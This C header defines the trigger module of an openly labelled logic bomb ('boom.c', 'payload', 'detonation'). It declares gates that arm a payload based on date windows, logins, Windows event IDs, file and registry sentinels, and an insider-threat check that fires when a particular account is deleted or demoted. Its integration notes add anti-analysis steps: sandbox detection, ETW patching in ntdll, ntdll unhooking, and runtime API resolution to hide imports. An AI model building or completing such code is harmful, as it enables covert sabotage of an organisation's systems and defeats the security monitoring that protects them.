/*
 * lb_trigger.h
 * Public interface for the lb_trigger pre-execution gate module.
 *
 * This module implements five independent trigger classes that must ALL
 * evaluate to ARMED before boom.c's payload sequence is allowed to proceed.
 * A single failing trigger holds the gate closed; the caller re-evaluates
 * on the next poll interval without any visible side-effect.
 *
 * Trigger classes (§ numbers match lb_trigger.c sections):
 *   §1  Time-Based     — date window, expiry deadline, business-hours window
 *   §2  Event-Based    — login event, service start, process appearance,
 *                        Windows Event Log ID match
 *   §3  Identity-Based — target account enabled/disabled/privilege check,
 *                        insider-threat sentinel (account deleted or demoted)
 *   §4  System-State   — file hash sentinel, registry value sentinel,
 *                        service liveness sentinel
 *   §5  Compound       — sequential ordering + logical AND of all prior gates
 *
 * Integration (see integration notes below each declaration):
 *
 *   boom.c main() — BEFORE config_load(), add:
 *       if (ev_sandbox_check()) return 0;   ← from lb_evasion
 *       ev_init();                           ← from lb_evasion
 *       ev_patch_etw_ntdll();               ← from lb_evasion
 *       ev_unhook_ntdll();                  ← from lb_evasion
 *       lt_init();                           ← this module
 *
 *   boom.c poll loop — replace the body's fire-decision block with:
 *       if (lt_evaluate() == LT_ARMED) fire = 1;
 *
 *   lb_payload.c payload_run() — insert at the very top (before resolve_ntdll):
 *       if (lt_evaluate() != LT_ARMED) { log_write("payload: gate closed, abort"); return; }
 *
 * Build: add lb_trigger.c to the cl / gcc invocation alongside lb_evasion.c.
 *        No additional libs beyond what boom.c / lb_payload.c already pull in.
 */

#ifndef LB_TRIGGER_H
#define LB_TRIGGER_H

#ifdef __cplusplus
extern "C" {
#endif

#include <windows.h>
#include <stdint.h>

/* ── Gate return values ── */
#define LT_ARMED   1   /* all gates pass — caller may proceed           */
#define LT_HOLD    0   /* one or more gates pending — caller must wait  */

/*
 * lt_init
 * Initialise the trigger module.  Resolves the WinEvt API (wevtapi.dll)
 * at runtime so there is no static import-table entry for it.
 * Safe to call multiple times — subsequent calls are no-ops.
 * Must be called before lt_evaluate().
 */
void lt_init(void);

/*
 * lt_evaluate
 * Evaluates all five trigger classes in order.  Returns LT_ARMED only
 * when every class independently passes.  All results are logged to
 * the runtime log (lb_run.log) regardless of outcome so post-mortem
 * forensics can reconstruct the detonation conditions.
 *
 * Internal evaluation order (sequential — each class runs even if a
 * prior one already failed, to produce a complete log snapshot):
 *   1. Time-Based
 *   2. Event-Based
 *   3. Identity-Based
 *   4. System-State
 *   5. Compound (summarises the above four + sequential ordering check)
 *
 * Returns LT_ARMED (1) or LT_HOLD (0).
 */
int lt_evaluate(void);

#ifdef __cplusplus
}
#endif
#endif /* LB_TRIGGER_H */